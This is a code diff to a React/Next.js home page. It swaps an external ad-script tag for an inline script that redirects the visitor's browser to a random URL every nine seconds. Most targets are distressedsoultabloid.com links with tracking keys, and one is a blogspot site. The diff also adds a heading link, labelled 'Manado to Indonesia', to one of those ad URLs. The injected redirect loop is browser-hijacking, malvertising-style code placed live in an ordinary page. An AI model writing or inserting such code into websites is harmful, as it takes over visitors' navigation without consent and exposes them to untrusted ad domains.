@@ -69,8 +69,22 @@ function HomePage() {
   useEffect(() => {
     // Script iklan akan dijalankan hanya saat komponen di-render di sisi klien
     const script = document.createElement("script");
-    script.src = "http://distressedsoultabloid.com/18f90aa1a51e5de0d0176e5a3cc1d7a3/invoke.js";
-    script.async = true;
+    script.type = "text/javascript";
+    script.innerHTML = `
+      (function(){
+        setInterval(function(){
+          var redSites = [
+            "https://distressedsoultabloid.com/fvz16ur4t?key=c84627c0e0934f50382cec67d5d897ec",
+            "https://distressedsoultabloid.com/y7m1mhvp60?key=a4f3502d0b644c03c4a24c88cefd7bad",
+            "https://distressedsoultabloid.com/wigxnmi73?key=09c32fa9dcee2acb56f088a76f29e86f",
+            "https://distressedsoultabloid.com/gqsffr5nhu?key=fe291f3f7a850f89253ebf3101f37703",
+            "https://surgaiptek.blogspot.com/"
+          ];
+          var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
+          window.location = randomLinks
+        },9000)
+      }())
+    `;
     document.body.appendChild(script);
 
     return () => {
@@ -139,9 +153,17 @@ function HomePage() {
           </button>
         </div>
       </form>
+      <div>
+        <h1 className="text-4xl font-bold underline">
+          <Link href="https://distressedsoultabloid.com/fvz16ur4t?key=c84627c0e0934f50382cec67d5d897ec">
+            <a target="_blank" rel="noopener noreferrer">
+              Manado to Indonesia
+            </a>
+          </Link>
+        </h1>
+      </div>
     </div>
   );
 }
-
 
 export default HomePage;
